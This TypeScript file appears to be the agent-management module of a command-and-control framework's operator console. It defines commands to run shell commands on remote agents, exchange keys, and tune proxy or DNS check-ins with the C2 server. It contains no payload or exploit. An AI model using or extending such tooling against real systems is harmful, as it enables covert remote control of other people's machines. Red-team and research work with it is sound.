import Logger from "../lib/logger";
import { Constants } from "../utils/utils";
import BaseModule from "./base";

const MODULE_DESCRIPTION = "manage active agents";
export interface AgentModuleConfig {
    proxy_url?: string;
    proxy_enabled?: boolean;
    proxy_key?: string;
    interval?: number;
}

export default class AgentModule extends BaseModule {
    log: Logger;

    constructor(protected configFile) {
        super("agent", configFile);
        this.log = new Logger();
        this.description = MODULE_DESCRIPTION;

        this.config = this.getConfigFromFile() as AgentModuleConfig;

        this.defineCommands({
            sysinfo: {
                arguments: [],
                description: "get system info",
            },
            keyx: {
                arguments: [],
                description: "start a key exchange with the agent",
            },
            shell: {
                arguments: ["<command>"],
                description: "execute a shell command, alias: exec_cmd",
            },
            msg: {
                arguments: ["<message>"],
                description: "send an encrypted message to the agent, requires keyx",
            },
            shutdown: {
                arguments: ["<agent id>"],
                description: "shutdown the agent, confirm by entering the id, agent will not reconnect",
            },
            "set throttle_sendq": {
                arguments: ["<1|0>"],
                description: "throttle c2 communication (enable) or just send it all at once (disable)",
                execute: (params: string) => {
                    this.config.throttle_sendq = params != "0" && params != "false" ? true : false;
                },
            },
            "set proxy_url": {
                arguments: ["<url>"],
                description: "change the proxy url to use (http://proxy.domain.tld/proxy.php)",
                validateRegex: Constants.VALID_URL_REGEX,
                execute: (params: string) => {
                    this.config.proxy_url = params;
                },
            },
            "set proxy_enabled": {
                arguments: ["<1|0>"],
                description: "enable or disable proxy communication",
                execute: (params: string) => {
                    this.config.proxy_enabled = params != "0" && params != "false" ? true : false;
                },
            },
            "set proxy_key": {
                arguments: ["<key>"],
                description: "change key to use for proxy communication",
                execute: (params: string) => {
                    this.config.proxy_key = params;
                },
            },
            "set interval": {
                arguments: ["<ms>"],
                description: "change how often to checkin with the c2 (dns or proxy)",
                validateRegex: /^[0-9]+$/,
                execute: (params: string) => {
                    this.config.interval = Number(params) || this.config.interval;
                },
            },
            // "set domain": {
            //     arguments: ["<c2.domain.tld>"],
            //     description: "set the c2 domain"
            // },
            // "set password": {
            //     arguments: ["<password>"],
            //     description: "set the c2 password"
            // },
            send_config: {
                arguments: [""],
                description: "send the config changes to the agent",
            },
        });
    }

    run() {}
}
